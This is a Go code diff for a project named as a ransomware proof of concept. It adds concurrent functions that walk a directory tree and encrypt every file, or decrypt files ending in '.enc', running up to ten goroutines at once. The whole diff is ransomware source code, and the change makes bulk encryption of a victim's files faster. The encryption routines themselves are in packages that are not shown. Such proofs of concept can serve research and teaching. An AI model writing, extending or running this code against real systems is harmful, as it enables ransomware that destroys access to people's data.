@@ -4,7 +4,10 @@ import (
 	"fmt"
 	"github.com/arviiyer/ransomware-poc/decryption" // Import the decryption package
 	"github.com/arviiyer/ransomware-poc/encryption" // Import the encryption package
+	"os"
+	"path/filepath"
 	"strings"
+	"sync"
 )
 
 // Get the user's choice (Encrypt or Decrypt)
@@ -42,8 +45,8 @@ func main() {
 			return
 		}
 
-		// Encrypt all files in the directory using the generated key
-		err = encryption.EncryptFilesInDirectory(dirPath, key)
+		// Encrypt all files in the directory using the generated key with concurrency
+		err = encryptFilesConcurrently(dirPath, key)
 		if err != nil {
 			fmt.Println("Error encrypting files in the directory:", err)
 		} else {
@@ -58,8 +61,8 @@ func main() {
 			return
 		}
 
-		// Decrypt all .enc files in the directory using the loaded key
-		err = decryption.DecryptFilesInDirectory(dirPath, key)
+		// Decrypt all .enc files in the directory using the loaded key with concurrency
+		err = decryptFilesConcurrently(dirPath, key)
 		if err != nil {
 			fmt.Println("Error decrypting files in the directory:", err)
 		} else {
@@ -67,6 +70,67 @@ func main() {
 		}
 
 	default:
-		fmt.Println("Invalid choice. Please enter 'e' for encryption or 'd' for decryption.")
+		fmt.Println("Invalid choice. Please enter 'e' to encrypt or 'd' to decrypt.")
 	}
 }
+
+// encryptFilesConcurrently encrypts all files in a given directory concurrently
+func encryptFilesConcurrently(dirPath string, key []byte) error {
+	var wg sync.WaitGroup
+	semaphore := make(chan struct{}, 10) // Allow only 10 concurrent goroutines
+
+	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+		if !info.IsDir() {
+			wg.Add(1)
+			semaphore <- struct{}{} // Acquire semaphore
+			go func(filePath string) {
+				defer wg.Done()
+				defer func() { <-semaphore }() // Release semaphore
+
+				if err := encryption.EncryptFile(filePath, key); err != nil {
+					fmt.Printf("Failed to encrypt file %s: %v\n", filePath, err)
+				} else {
+					fmt.Printf("Encrypted %s successfully\n", filePath)
+				}
+			}(path)
+		}
+		return nil
+	})
+
+	wg.Wait() // Wait for all goroutines to finish
+	return err
+}
+
+// decryptFilesConcurrently decrypts all .enc files in a given directory concurrently
+func decryptFilesConcurrently(dirPath string, key []byte) error {
+	var wg sync.WaitGroup
+	semaphore := make(chan struct{}, 10) // Allow only 10 concurrent goroutines
+
+	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+		if !info.IsDir() && strings.HasSuffix(path, ".enc") {
+			wg.Add(1)
+			semaphore <- struct{}{} // Acquire semaphore
+			go func(filePath string) {
+				defer wg.Done()
+				defer func() { <-semaphore }() // Release semaphore
+
+				if err := decryption.DecryptFile(filePath, key); err != nil {
+					fmt.Printf("Failed to decrypt file %s: %v\n", filePath, err)
+				} else {
+					fmt.Printf("Decrypted %s successfully\n", filePath)
+				}
+			}(path)
+		}
+		return nil
+	})
+
+	wg.Wait() // Wait for all goroutines to finish
+	return err
+}
+
